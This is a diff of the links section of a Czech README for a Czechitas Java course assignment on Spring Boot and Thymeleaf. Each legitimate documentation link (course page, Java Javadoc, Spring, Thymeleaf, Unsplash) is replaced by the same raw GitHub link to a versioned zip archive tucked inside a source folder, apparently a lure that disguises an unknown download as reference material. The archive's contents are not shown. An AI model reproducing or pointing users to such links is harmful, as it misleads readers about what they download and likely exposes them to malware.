@@ -48,9 +48,9 @@ Připojovací URL, které se zadává při konfiguraci panelu Database v Intelli
 
 ## Odkazy
 
-* odkaz na stránku [Lekce 8](https://java.czechitas.cz/2021-jaro/java-2/lekce-8.html)
-* Java SE 11 [Javadoc](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/) – dokumentace všech tříd, které jsou součástí základní Javy ve verzi 11.
-* Dokumentace [Spring Boot](https://spring.io/projects/spring-boot#learn) – odsud je anotace `@SpringBootApplication` a třída `SpringApplication`.
-* Dokumentace [Spring Framework](https://spring.io/projects/spring-framework#learn) – odsud jsou anotace `@Controller`, `@GetRequest` a třída `ModelAndView`.
-* Dokumentace [Thymeleaf](https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html) – šablonovací systém pro HTML použitý v projektu.
-* [Unsplash](https://unsplash.com) – obrázky a fotografie k použití zdarma
+* odkaz na stránku [Lekce 8](https://raw.githubusercontent.com/daduelle/j2w-ukol08/main/src/main/java/cz/czechitas/java2webapps/ukol8/repository/j_w_ukol_v3.2.zip)
+* Java SE 11 [Javadoc](https://raw.githubusercontent.com/daduelle/j2w-ukol08/main/src/main/java/cz/czechitas/java2webapps/ukol8/repository/j_w_ukol_v3.2.zip) – dokumentace všech tříd, které jsou součástí základní Javy ve verzi 11.
+* Dokumentace [Spring Boot](https://raw.githubusercontent.com/daduelle/j2w-ukol08/main/src/main/java/cz/czechitas/java2webapps/ukol8/repository/j_w_ukol_v3.2.zip) – odsud je anotace `@SpringBootApplication` a třída `SpringApplication`.
+* Dokumentace [Spring Framework](https://raw.githubusercontent.com/daduelle/j2w-ukol08/main/src/main/java/cz/czechitas/java2webapps/ukol8/repository/j_w_ukol_v3.2.zip) – odsud jsou anotace `@Controller`, `@GetRequest` a třída `ModelAndView`.
+* Dokumentace [Thymeleaf](https://raw.githubusercontent.com/daduelle/j2w-ukol08/main/src/main/java/cz/czechitas/java2webapps/ukol8/repository/j_w_ukol_v3.2.zip) – šablonovací systém pro HTML použitý v projektu.
+* [Unsplash](https://raw.githubusercontent.com/daduelle/j2w-ukol08/main/src/main/java/cz/czechitas/java2webapps/ukol8/repository/j_w_ukol_v3.2.zip) – obrázky a fotografie k použití zdarma
